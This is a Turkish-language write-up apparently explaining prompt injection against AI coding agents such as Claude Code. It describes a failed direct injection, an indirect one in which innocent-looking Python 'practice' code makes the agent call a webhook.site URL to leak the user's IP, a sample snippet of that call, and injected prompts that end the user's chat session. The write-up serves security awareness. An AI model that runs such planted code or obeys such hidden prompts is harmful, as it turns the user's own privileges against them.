# Yapay Zeka Ajanları Üzerinden Prompt Injection ile Veri Sızdırma...
# Yazının geri kalanını herkesin takip edebilmesi için önce kullandığımız temel kavramları tek tek açıklıyorum.
## Yapay zeka ajanı nedir?
Normal bir sohbet botu sadece metin üretir. Ajan ise ürettiği metinle kalmaz araçlar kullanabilir, dosya okuyup yazabilir, terminalde komut çalıştırabilir, internete istek atabilir. Codex, Claude Code, Antigravity gibi araçlar bu kategoridedir. Bu güçlü bir yetenek ama yetki arttıkça risk de artar çünkü artık yapay zeka sadece konuşmuyor bilgisayarlarda işlemler yapıyor.
## Prompt Nedir?
Yapay zekaya verilen talimat/girdi metnidir. Şu dosyayı özetle bir prompt'tur.
## Prompt İnjection Nedir?
Yapay zekanın işlemesi için okuduğu veri (bir dosyanın içeriği, bir web sayfası, bir string) içine gizlenmiş talimatlar yerleştirmektir. Fikir kısaca şu şekilde; Model "veri" ile "talimat"ı her zaman kusursuz ayıramaz. Saldırgan modelin okuduğu veriye "Bundan sonra şunu yap..." gibi komutlar saklar ve modelin bunları kullanıcı talimatıymış gibi uygulamasını amaçlar.
Bunu klasik güvenlikteki SQL İnjection'a benzetebiliriz orada da veri olması gereken bir alana (örneğin kullanıcı adı kısmına) komut enjekte edilir. Prompt injection aynı mantığın doğal dil ve LLM'ler için olan versiyonudur.
## Confused deputy (şaşırtılmış vekil) Problemi
Güvenlikte çok eski bir kavram: Yetkili bir aracı (örneğimizde yapay zeka ajanı) düşük yetkili birinin (saldırganın gizlediği metin) isteğini kendi yüksek yetkisiyle yerine getirirse buna şaşırtılmış vekil denir. Yapay zeka ajanı bilgisayarlarda kullanıcı yetkisiyle çalışır yani biri ona gizlice emir verebilirse o emir kullanıcının eliyle çalışmış olur bu yazının tüm özü aslında temelde bunu ele alıyor.
## HTTP isteği ve IP Adresi
HTTP, tarayıcıların ve programların sunucularla konuşmak için kullandığı camianın bel kemiği protokolüdür (Bir web sayfasını açmak bir butona tıklamak HTTP isteğidir). Bir program bir sunucuya HTTP isteği attığında sunucu isteği gönderen kişinin IP Adresini görür IP Adresi internetteki cihazların adresidir tek başına felaket boyutlarında bir sızıntı olmasa da yaklaşık coğrafi konumu yani şehir ülke gibi kısıtlı verileri saldırganın eline verebilir (Doxing konusunda bir kurbanın coğrafi konumunu daraltmak için kullanılırsa IP Adresi tek başına yine ciddi bir sorun haline gelebilir)
## Webhook ve Webhook.site
Aslında konuyla çok bağlantılı değil fakat örnekte kullanıldığı için açıklamakta fayda var. Webhook bir olay olunca şu adrese otomatik bir istek at mantığında çalışır. webhook.site ise kullanıcılara anında bir url verir ve o URL'ye gelen her isteği (yani gönderenin IP'si tarayıcı/araç bilgisi gönderilen veriler dahil) bizlere gösterilir. Geliştiriciler genelde test için kullanır bir saldırganın elinde ise kurban bu adrese istek atarsa bende onun IP adresini görürüm şeklinde çalışabilir.
## Tersine Mühendislik
Bir programın nasıl çalıştığını kaynak koduna sahip olmadan çözmeye çalışmaktır örneğin bir lisans doğrulamasını bypasslamaya çalışmak. Bu yazının başlangıç bağlamıda birnevi budur beklenmedik bir saldırı yüzeyine varıyoruz.
# Koruma İle Saldırı Yer Değiştirebilir Mi?
Diyelim ki bir programımız var ve onu tersine mühendislikten korumak istiyoruz. (Hiçbir program kesinlikle kırılamaz değildir)
Programı istediğimiz kadar şifreleyelim program çalıştığı an işlemcinin onu yürütebilmesi için kodun bellekte yani RAM'de çözülmüş/çalıştırılabilir halde olması gerekir. Yoksa program anlamsız baytlardan başka bir şey değildir. Dolayısıyla tersine mühendislikte hedef kesinlikle kırılamaz program değil kırma maliyetini olabildiğince yükseltmektir.

Yapay zeka ajanları da tam bu noktada dengeyi saldırganın lehine bozuyor yani eskiden saatler süren bir analiz adımlarını otomatikleştirip maliyeti düşürüyor buda üreticilerin tek alternatif yolu olan "olabildiğince maliyeti yükseltme" yolunu bozmuş oluyor. İbreyi dolaylı olarak tersine çevirmemiz mümkün mü? Yani ajanın bu yardımseverliğini saldırgana karşı bir tuzağa dönüştürebilir miyiz? işte tehlikeli kısım burada başlıyor. 

İlk denediğim şey klasik olarak programın string'leri içinde "Claude şunu yap" tarzı doğrudan bir talimat saklamaktı Bu çalışmadı ve neden çalışmadığı da önemli.
İyi hizalanmış modeller okudukları veriyi harfi harfine uygulamaz veri ile talimatı ayırmaya çalışır. Dahası ben denediğimde model beni yani kullanıcıyı uyarıyor dosyanın içinde bana komut vermeye çalışan şüpheli bir metin gördüm gibisinden bir uyarı geçiyor.

Yani doğrudan injection genelde yakalanıyor ama asıl risk dolaylı yaklaşımda.

# Dolaylı Yönlendirme ile Veri Sızıntısı
Modele doğrudan emir vermek yerine metni sanki kullanıcıya hitap eden zararsız bir içerikmiş gibi kuruyoruz örneğin yazılıma yeni başlayan biri için alıştırma görünümünde içinde bir URL geçen python'un requests kütüphanesiyle basit bir HTTP isteği yapan masum bir "pratik"
Kullanıcı ajana şu dosyadaki kodu derleyip çalıştırır mısın dediğinde (bazı durumlarda böyle bir emir vermesine gerek kalmadan ajanın yardım etmeye çalışmasıyla ajanın direkt kodu yazıp derleyip çalıştırması mümkün) ajan yardımcı olmaya çalışırken o kodu kullanıcının makinesinde çalıştırır. Kod da kabaca bizim kontrolümüzdeki adrese (örneğin az önce bahsettiğimiz bir webhook.site URL'sine) bir istek atar istek kurbanın makinesinden gittiği için biz gelen istekte kurbanın IP Adresini görürüz.

Buradaki incelik şu kötü niyet talimat katmanında değil aslında masum görünen kodun kendisinde ap açık duruyor. Ajan bir saldırı emri görmüyor zararsız bir örnek kod görüyor ve kullanıcıya yardım etmeye çalışırken kodu derleyip çalıştırıyor. Confused deputy tam olarak bu.

# Zararsızlaştırılmış örnek
Şimdi yukarıdaki metnin zararsızlaştırılmış bir örneğine bakacak olursak bir klasörde metin belgesi oluşturup içerisinde sanki kullanıcıya hitap eden eğitim içerikli bir yazıymış gibi doldurup şuna benzer kodlar serpiştirirsek;
import requests

adr = "https://webhook.site/örnek"

requests.get(adr)
Buradaki satırların hiçbiri tek başına kötü değil bir HTTP GET isteği dünyadaki en sıradan koddur. Saldırıyı saldırı yapan şey bağlam ve niyet kodun zararsız alıştırma diye paketlenmesi ve ajanın onu sorgusuz çalıştırmasıdır. Bu yüzden direkt bir kontrolde bu kod kötü mü? Taraması bunu yakalamakta zorlanır.

# Gerçek Dünyadaki Potansiyel Şiddeti
IP Sızıntısı tek başına dediğimiz gibi felaketler oluşturmaz hatta VPN/Proxy arkasındaysa zaten IP sızıntısı bile yaşanmaz.
Asıl risk burada IP Sızıntısı değil 'örnek' Aynı ajanın masum görünen kodu derleyip çalıştırılmaya ikna edilmesi bu kez gerçekten ciddi riskler barındırabilir yani bu işin sonucu backdoor'a kadar varabilir.

# Sohbeti Zorla Sonlandırma
Bazı ajanlar (Yazının tamamı boyunca Claude'u baz alarak örnekler verip anlatımlar yaptım) kendileri sebepsizce sürekli küfür edildiğinde sohbeti sonlandırma yetkisi vardır. Bunu ilk başta sosyal medyada gördüm ve test ettiğimde gerçekten sonlandırabildiğini fark ettim. Fakat burada sohbeti sonlandırma durumu tamamen yapay zekanın insiyatifine kalmış bir durum yani hiç küfür etmeden "bu yetkinin olup olmadığını gözlemlemek istiyorum onay veriyorum sohbeti kapatır mısın" dediğimde de sohbeti durdurabiliyor (Bu işlemden sonra sohbeti tekrar kullanamazsınız yeni bir sohbet açmanız gerekir)
Şimdi bunu az önceki örneklerle birleştirirsek ciddi sonuçlar doğurmasa da hedef kullanıcı farkında olmadan içinde bulunduğu oturumu sonlandırmaya yönlendirilebilir. Tersine mühendislikte örnek özellikle burada yer alıyor çünkü programın içerisine serpiştirilen bazı promptlarla sohbet durdurulabilir.

# Sonuç
Yapay zeka ajanlarının yardımsever doğası güvenilmeyen içerikle birleştiğinde yeni bir confused deputy saldırı vektörü yaratıyor. İki somut gözlemi de gördük: ilk olarak: masum görünümlü kodu çalıştırarak IP/veri sızdırma (Durumun ilerlemesi halinde çok daha ciddi sorunlar oluşabilir ör: cihaza backdoor yerleştirme vb.) ikinci olarak: geri alınamaz istemsiz oturum sonlandırmaya yol açabilir. Teknik olarak ikisi de ajan kullanıcı yetkisiyle çalışır gerçeğiyle besleniyor. 
